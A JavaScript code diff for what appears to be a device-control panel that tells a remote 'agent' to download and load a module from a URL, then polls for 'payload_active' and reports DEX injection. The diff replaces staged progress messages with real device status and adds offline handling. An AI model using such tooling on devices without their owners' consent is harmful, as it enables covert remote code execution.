@@ -339,10 +339,18 @@ const UI = {
         }
 
         const deviceId = state.data.selectedDeviceId;
-        setState({ ui: { modal: { type: "injection", title, logs: ["Initializing secure bridge...", "Targeting device: " + deviceId] } } });
+        const device = state.data.devices.find(dev => dev.id === deviceId);
+        const status = (typeof device?.status === "string") ? JSON.parse(device.status || "{}") : (device?.status || {});
 
-        await new Promise(r => setTimeout(r, 800));
-        this.updateInjectionLog("Requesting remote configuration...");
+        const arch = status.abi || "arm64-v8a (guessed)";
+        const model = status.model || "Unknown Device";
+
+        setState({ ui: { modal: { type: "injection", title, logs: [
+            "Initializing secure bridge...",
+            `Targeting: ${model}`,
+            `Architecture: ${arch}`,
+            "Awaiting agent handshake..."
+        ] } } });
 
         const cmd = isUpdate ? `${CMD.LOAD_MODULE}:update:${url}:${className}` : `${CMD.LOAD_MODULE}:${url}:${className}`;
         const success = await DeviceService.send(cmd, { showSuccess: false });
@@ -354,12 +362,11 @@ const UI = {
             return false;
         }
 
-        this.updateInjectionLog("Command acknowledged by agent.");
-        this.updateInjectionLog("Device is downloading payload...");
+        this.updateInjectionLog("Command delivered. Waiting for agent...");
 
-        // Real-time synchronization: Wait for status update from device
+        // Real-time synchronization: Wait for status update or REAL logs from device
         let attempts = 0;
-        const maxAttempts = 40; // ~20 seconds
+        const maxAttempts = 80; // 40 seconds timeout for full download/load
 
         return new Promise((resolve) => {
             const checkInterval = setInterval(async () => {
@@ -367,11 +374,11 @@ const UI = {
 
                 // Refresh device data from state (updated via realtime Supabase)
                 const d = state.data.devices.find(dev => dev.id === deviceId);
-                const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+                const currentStatus = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
 
-                if (status.payload_active) {
+                if (currentStatus.payload_active) {
                     clearInterval(checkInterval);
-                    this.updateInjectionLog("Verifying runtime integrity...");
+                    this.updateInjectionLog("Verifying integrity...");
                     await new Promise(r => setTimeout(r, 800));
                     this.updateInjectionLog("Injection successful. Payload active.");
                     await new Promise(r => setTimeout(r, 1000));
@@ -381,13 +388,18 @@ const UI = {
                     return;
                 }
 
-                if (attempts === 5) this.updateInjectionLog("Extracting native components...");
-                if (attempts === 15) this.updateInjectionLog("Injecting DEX into process...");
-                if (attempts === 25) this.updateInjectionLog("Waiting for final heartbeat...");
+                // If device went offline during process
+                if (!isOnline(d)) {
+                    clearInterval(checkInterval);
+                    this.updateInjectionLog("ERROR: Device disconnected.");
+                    await new Promise(r => setTimeout(r, 2000));
+                    closeModal();
+                    resolve(false);
+                }
 
                 if (attempts >= maxAttempts) {
                     clearInterval(checkInterval);
-                    this.updateInjectionLog("ERROR: Injection timed out.");
+                    this.updateInjectionLog("ERROR: Process timed out.");
                     await new Promise(r => setTimeout(r, 2000));
                     closeModal();
                     resolve(false);
